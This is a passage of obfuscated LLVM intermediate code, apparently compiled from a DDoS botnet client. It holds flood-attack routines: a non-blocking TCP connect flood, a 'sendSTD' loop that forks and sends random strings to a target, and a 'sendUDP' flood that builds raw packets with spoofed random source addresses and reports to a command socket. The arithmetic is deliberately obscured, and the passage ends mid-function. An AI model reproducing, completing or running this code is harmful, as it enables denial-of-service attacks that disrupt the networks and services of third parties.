  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %256 [
    i32 0, label %68
    i32 1, label %127
    i32 2, label %230
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = xor i32 %84, -1
  %86 = xor i32 2048, -1
  %87 = xor i32 -1575207691, -1
  %88 = and i32 %85, -1575207691
  %89 = and i32 %84, %87
  %90 = and i32 %86, -1575207691
  %91 = and i32 2048, %87
  %92 = or i32 %88, %89
  %93 = or i32 %90, %91
  %94 = xor i32 %92, %93
  %95 = or i32 %85, %86
  %96 = xor i32 %95, -1
  %97 = or i32 -1575207691, %87
  %98 = and i32 %96, %97
  %99 = or i32 %94, %98
  %100 = or i32 %84, 2048
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %99)
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %108 = call i32 @connect(i32 %106, %struct.sockaddr* %107, i32 16)
  %109 = icmp ne i32 %108, -1
  br i1 %109, label %114, label %110

; <label>:110:                                    ; preds = %68
  %111 = call i32* @__errno_location() #13
  %112 = load i32, i32* %111, align 4
  %113 = icmp ne i32 %112, 115
  br i1 %113, label %114, label %121

; <label>:114:                                    ; preds = %110, %68
  %115 = load i32, i32* %8, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %116
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = call i32 @close(i32 %119)
  br label %126

; <label>:121:                                    ; preds = %110
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 1
  store i8 1, i8* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %121, %114
  br label %256

; <label>:127:                                    ; preds = %61
  br label %128

; <label>:128:                                    ; preds = %127
  %129 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %130 = getelementptr inbounds [16 x i64], [16 x i64]* %129, i64 0, i64 0
  %131 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %130) #2, !srcloc !6
  %132 = extractvalue { i64, i64* } %131, 0
  %133 = extractvalue { i64, i64* } %131, 1
  %134 = trunc i64 %132 to i32
  store i32 %134, i32* %18, align 4
  %135 = ptrtoint i64* %133 to i64
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %19, align 4
  br label %137

; <label>:137:                                    ; preds = %128
  br label %138

; <label>:138:                                    ; preds = %137
  %139 = load i32, i32* %8, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %140
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = srem i32 %143, 64
  %145 = zext i32 %144 to i64
  %146 = shl i64 1, %145
  %147 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = sdiv i32 %152, 64
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [16 x i64], [16 x i64]* %147, i64 0, i64 %154
  %156 = load i64, i64* %155, align 8
  %157 = xor i64 %156, -1
  %158 = xor i64 %146, -1
  %159 = xor i64 550427012891302165, -1
  %160 = and i64 %157, 550427012891302165
  %161 = and i64 %156, %159
  %162 = and i64 %158, 550427012891302165
  %163 = and i64 %146, %159
  %164 = or i64 %160, %161
  %165 = or i64 %162, %163
  %166 = xor i64 %164, %165
  %167 = or i64 %157, %158
  %168 = xor i64 %167, -1
  %169 = or i64 550427012891302165, %159
  %170 = and i64 %168, %169
  %171 = or i64 %166, %170
  %172 = or i64 %156, %146
  store i64 %171, i64* %155, align 8
  %173 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %173, align 8
  %174 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %174, align 8
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = sub i32 %179, -317648308
  %181 = add i32 %180, 1
  %182 = add i32 %181, -317648308
  %183 = add nsw i32 %179, 1
  %184 = call i32 @select(i32 %182, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %184, i32* %15, align 4
  %185 = load i32, i32* %15, align 4
  %186 = icmp eq i32 %185, 1
  br i1 %186, label %187, label %214

; <label>:187:                                    ; preds = %138
  store i32 4, i32* %13, align 4
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %189
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = bitcast i32* %14 to i8*
  %194 = call i32 @getsockopt(i32 %192, i32 1, i32 4, i8* %193, i32* %13) #2
  %195 = load i32, i32* %14, align 4
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %208

; <label>:197:                                    ; preds = %187
  %198 = load i32, i32* %8, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %199
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 8
  %203 = call i32 @close(i32 %202)
  %204 = load i32, i32* %8, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %205
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %206, i32 0, i32 1
  store i8 0, i8* %207, align 4
  br label %213

; <label>:208:                                    ; preds = %187
  %209 = load i32, i32* %8, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %210
  %212 = getelementptr inbounds %struct.state_t, %struct.state_t* %211, i32 0, i32 1
  store i8 2, i8* %212, align 4
  br label %213

; <label>:213:                                    ; preds = %208, %197
  br label %229

; <label>:214:                                    ; preds = %138
  %215 = load i32, i32* %15, align 4
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %217, label %228

; <label>:217:                                    ; preds = %214
  %218 = load i32, i32* %8, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %219
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 8
  %223 = call i32 @close(i32 %222)
  %224 = load i32, i32* %8, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %225
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %226, i32 0, i32 1
  store i8 0, i8* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %217, %214
  br label %229

; <label>:229:                                    ; preds = %228, %213
  br label %256

; <label>:230:                                    ; preds = %61
  %231 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %231, i32 1024)
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = load i8*, i8** %16, align 8
  %238 = call i64 @send(i32 %236, i8* %237, i64 1024, i32 16384)
  %239 = icmp eq i64 %238, -1
  br i1 %239, label %240, label %255

; <label>:240:                                    ; preds = %230
  %241 = call i32* @__errno_location() #13
  %242 = load i32, i32* %241, align 4
  %243 = icmp ne i32 %242, 11
  br i1 %243, label %244, label %255

; <label>:244:                                    ; preds = %240
  %245 = load i32, i32* %8, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %246
  %248 = getelementptr inbounds %struct.state_t, %struct.state_t* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = call i32 @close(i32 %249)
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 1
  store i8 0, i8* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %244, %240, %230
  br label %256

; <label>:256:                                    ; preds = %255, %229, %126, %61
  br label %257

; <label>:257:                                    ; preds = %256
  %258 = load i32, i32* %8, align 4
  %259 = add i32 %258, 1169712657
  %260 = add i32 %259, 1
  %261 = sub i32 %260, 1169712657
  %262 = add nsw i32 %258, 1
  store i32 %261, i32* %8, align 4
  br label %57

; <label>:263:                                    ; preds = %57
  br label %52

; <label>:264:                                    ; preds = %52
  %265 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %265)
  br label %266

; <label>:266:                                    ; preds = %264, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [36 x i8*], align 16
  %15 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %16 = call i32 @fork() #2
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %3
  %20 = load i32, i32* %8, align 4
  %21 = icmp slt i32 %20, 1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %3
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %24, i32* %7, align 4
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %9, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %11, align 8
  %29 = bitcast %struct.sockaddr_in* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 16, i32 4, i1 false)
  %30 = load %struct.hostent*, %struct.hostent** %11, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 4
  %32 = load i8**, i8*** %31, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %36 = bitcast %struct.in_addr* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %11, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = sext i32 %39 to i64
  call void @bcopy(i8* %34, i8* %36, i64 %40) #2
  %41 = load %struct.hostent*, %struct.hostent** %11, align 8
  %42 = getelementptr inbounds %struct.hostent, %struct.hostent* %41, i32 0, i32 2
  %43 = load i32, i32* %42, align 8
  %44 = trunc i32 %43 to i16
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 %44, i16* %45, align 4
  %46 = load i32, i32* %5, align 4
  %47 = trunc i32 %46 to i16
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 0, i32* %12, align 4
  store i32 450, i32* %13, align 4
  br label %49

; <label>:49:                                     ; preds = %80, %23
  %50 = bitcast [36 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %50, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %51 = call i32 @rand() #2
  %52 = sext i32 %51 to i64
  %53 = urem i64 %52, 36
  %54 = getelementptr inbounds [36 x i8*], [36 x i8*]* %14, i64 0, i64 %53
  %55 = load i8*, i8** %54, align 8
  store i8* %55, i8** %15, align 8
  %56 = load i32, i32* %12, align 4
  %57 = icmp uge i32 %56, 50
  br i1 %57, label %58, label %80

; <label>:58:                                     ; preds = %49
  %59 = load i32, i32* %7, align 4
  %60 = load i8*, i8** %15, align 8
  %61 = load i32, i32* %13, align 4
  %62 = sext i32 %61 to i64
  %63 = call i64 @send(i32 %59, i8* %60, i64 %62, i32 0)
  %64 = load i32, i32* %7, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = call i32 @connect(i32 %64, %struct.sockaddr* %65, i32 16)
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %68 = sext i32 %67 to i64
  %69 = load i64, i64* %9, align 8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = sub i64 0, %71
  %73 = sub i64 %69, %72
  %74 = add nsw i64 %69, %71
  %75 = icmp sge i64 %68, %73
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %58
  %77 = load i32, i32* %7, align 4
  %78 = call i32 @close(i32 %77)
  call void @_exit(i32 0) #12
  unreachable

; <label>:79:                                     ; preds = %58
  store i32 0, i32* %12, align 4
  br label %80

; <label>:80:                                     ; preds = %79, %49
  %81 = load i32, i32* %12, align 4
  %82 = sub i32 %81, 1026763159
  %83 = add i32 %82, 1
  %84 = add i32 %83, 1026763159
  %85 = add i32 %81, 1
  store i32 %84, i32* %12, align 4
  br label %49
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %355

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %136

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %355

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = sub i32 0, %66
  %68 = sub i32 0, 1
  %69 = add i32 %67, %68
  %70 = sub i32 0, %69
  %71 = add nsw i32 %66, 1
  %72 = sext i32 %70 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %65
  br label %355

; <label>:77:                                     ; preds = %65
  %78 = load i8*, i8** %20, align 8
  %79 = load i32, i32* %13, align 4
  %80 = sub i32 0, 1
  %81 = sub i32 %79, %80
  %82 = add nsw i32 %79, 1
  %83 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %78, i8 0, i64 %83, i32 1, i1 false)
  %84 = load i8*, i8** %20, align 8
  %85 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %84, i32 %85)
  %86 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %87 = load i32, i32* %11, align 4
  %88 = sub i32 %86, -887250051
  %89 = add i32 %88, %87
  %90 = add i32 %89, -887250051
  %91 = add nsw i32 %86, %87
  store i32 %90, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %92

; <label>:92:                                     ; preds = %129, %125, %114, %77
  %93 = load i32, i32* %19, align 4
  %94 = load i8*, i8** %20, align 8
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %98 = call i64 @sendto(i32 %93, i8* %94, i64 %96, i32 0, %struct.sockaddr* %97, i32 16)
  %99 = load i32, i32* %22, align 4
  %100 = load i32, i32* %18, align 4
  %101 = icmp eq i32 %99, %100
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %92
  %103 = load i32, i32* %10, align 4
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %109

; <label>:105:                                    ; preds = %102
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  br label %109

; <label>:109:                                    ; preds = %105, %102
  %110 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %111 = load i32, i32* %21, align 4
  %112 = icmp sgt i32 %110, %111
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %109
  br label %135

; <label>:114:                                    ; preds = %109
  store i32 0, i32* %22, align 4
  br label %92

; <label>:115:                                    ; preds = %92
  %116 = load i32, i32* %22, align 4
  %117 = sub i32 0, %116
  %118 = sub i32 0, 1
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add i32 %116, 1
  store i32 %120, i32* %22, align 4
  %122 = load i32, i32* %23, align 4
  %123 = load i32, i32* %15, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %129

; <label>:125:                                    ; preds = %115
  %126 = load i32, i32* %16, align 4
  %127 = mul nsw i32 %126, 1000
  %128 = call i32 @usleep(i32 %127)
  store i32 0, i32* %23, align 4
  br label %92

; <label>:129:                                    ; preds = %115
  %130 = load i32, i32* %23, align 4
  %131 = sub i32 %130, -92058797
  %132 = add i32 %131, 1
  %133 = add i32 %132, -92058797
  %134 = add i32 %130, 1
  store i32 %133, i32* %23, align 4
  br label %92

; <label>:135:                                    ; preds = %113
  br label %355

; <label>:136:                                    ; preds = %52
  %137 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %137, i32* %24, align 4
  %138 = load i32, i32* %24, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %143, label %140

; <label>:140:                                    ; preds = %136
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i32 (i32, i8*, ...) @sockprintf(i32 %141, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i32 0, i32 0))
  br label %355

; <label>:143:                                    ; preds = %136
  store i32 1, i32* %25, align 4
  %144 = load i32, i32* %24, align 4
  %145 = bitcast i32* %25 to i8*
  %146 = call i32 @setsockopt(i32 %144, i32 0, i32 3, i8* %145, i32 4) #2
  %147 = icmp slt i32 %146, 0
  br i1 %147, label %148, label %151

; <label>:148:                                    ; preds = %143
  %149 = load i32, i32* @mainCommSock, align 4
  %150 = call i32 (i32, i8*, ...) @sockprintf(i32 %149, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i32 0, i32 0))
  br label %355

; <label>:151:                                    ; preds = %143
  store i32 50, i32* %26, align 4
  br label %152

; <label>:152:                                    ; preds = %160, %151
  %153 = load i32, i32* %26, align 4
  %154 = sub i32 0, %153
  %155 = sub i32 0, -1
  %156 = add i32 %154, %155
  %157 = sub i32 0, %156
  %158 = add nsw i32 %153, -1
  store i32 %157, i32* %26, align 4
  %159 = icmp ne i32 %153, 0
  br i1 %159, label %160, label %175

; <label>:160:                                    ; preds = %152
  %161 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %162 = call i32 @rand_cmwc()
  %163 = xor i32 %161, -1
  %164 = and i32 -1495005029, %163
  %165 = xor i32 -1495005029, -1
  %166 = and i32 %161, %165
  %167 = xor i32 %162, -1
  %168 = and i32 %167, -1495005029
  %169 = and i32 %162, %165
  %170 = or i32 %164, %166
  %171 = or i32 %168, %169
  %172 = xor i32 %170, %171
  %173 = xor i32 %161, %162
  call void @srand(i32 %172) #2
  %174 = call i32 @rand() #2
  call void @init_rand(i32 %174)
  br label %152

; <label>:175:                                    ; preds = %152
  %176 = load i32, i32* %12, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %175
  store i32 0, i32* %27, align 4
  br label %195

; <label>:179:                                    ; preds = %175
  %180 = load i32, i32* %12, align 4
  %181 = add i32 32, 90184409
  %182 = sub i32 %181, %180
  %183 = sub i32 %182, 90184409
  %184 = sub nsw i32 32, %180
  %185 = shl i32 1, %183
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub nsw i32 %185, 1
  %189 = xor i32 %187, -1
  %190 = and i32 -1, %189
  %191 = xor i32 -1, -1
  %192 = and i32 %187, %191
  %193 = or i32 %190, %192
  %194 = xor i32 %187, -1
  store i32 %193, i32* %27, align 4
  br label %195

; <label>:195:                                    ; preds = %179, %178
  %196 = load i32, i32* %13, align 4
  %197 = sext i32 %196 to i64
  %198 = sub i64 0, 28
  %199 = sub i64 0, %197
  %200 = add i64 %198, %199
  %201 = sub i64 0, %200
  %202 = add i64 28, %197
  %203 = call i8* @llvm.stacksave()
  store i8* %203, i8** %28, align 8
  %204 = alloca i8, i64 %201, align 16
  %205 = bitcast i8* %204 to %struct.iphdr*
  store %struct.iphdr* %205, %struct.iphdr** %29, align 8
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = bitcast %struct.iphdr* %206 to i8*
  %208 = getelementptr i8, i8* %207, i64 20
  %209 = bitcast i8* %208 to %struct.udphdr*
  store %struct.udphdr* %209, %struct.udphdr** %30, align 8
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = load i32, i32* %27, align 4
  %215 = call i32 @GetRandomIP(i32 %214)
  %216 = call i32 @htonl(i32 %215) #13
  %217 = load i32, i32* %13, align 4
  %218 = sext i32 %217 to i64
  %219 = sub i64 8, -2346982367924323080
  %220 = add i64 %219, %218
  %221 = add i64 %220, -2346982367924323080
  %222 = add i64 8, %218
  %223 = trunc i64 %221 to i32
  call void @makeIPPacket(%struct.iphdr* %210, i32 %213, i32 %216, i8 zeroext 17, i32 %223)
  %224 = load i32, i32* %13, align 4
  %225 = sext i32 %224 to i64
  %226 = add i64 8, 8324319630622225221
  %227 = add i64 %226, %225
  %228 = sub i64 %227, 8324319630622225221
  %229 = add i64 8, %225
  %230 = trunc i64 %228 to i16
  %231 = call zeroext i16 @htons(i16 zeroext %230) #13
  %232 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.3* %233 to %struct.anon.4*
  %235 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %234, i32 0, i32 2
  store i16 %231, i16* %235, align 2
  %236 = call i32 @rand_cmwc()
  %237 = trunc i32 %236 to i16
  %238 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %239 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %238, i32 0, i32 0
  %240 = bitcast %union.anon.3* %239 to %struct.anon.4*
  %241 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %240, i32 0, i32 0
  store i16 %237, i16* %241, align 2
  %242 = load i32, i32* %10, align 4
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %246

; <label>:244:                                    ; preds = %195
  %245 = call i32 @rand_cmwc()
  br label %251

; <label>:246:                                    ; preds = %195
  %247 = load i32, i32* %10, align 4
  %248 = trunc i32 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #13
  %250 = zext i16 %249 to i32
  br label %251

; <label>:251:                                    ; preds = %246, %244
  %252 = phi i32 [ %245, %244 ], [ %250, %246 ]
  %253 = trunc i32 %252 to i16
  %254 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 0
  %256 = bitcast %union.anon.3* %255 to %struct.anon.4*
  %257 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %256, i32 0, i32 1
  store i16 %253, i16* %257, align 2
  %258 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.3* %259 to %struct.anon.4*
  %261 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %260, i32 0, i32 3
  store i16 0, i16* %261, align 2
  %262 = load %struct.udphdr*, %struct.udphdr** %30, align 8
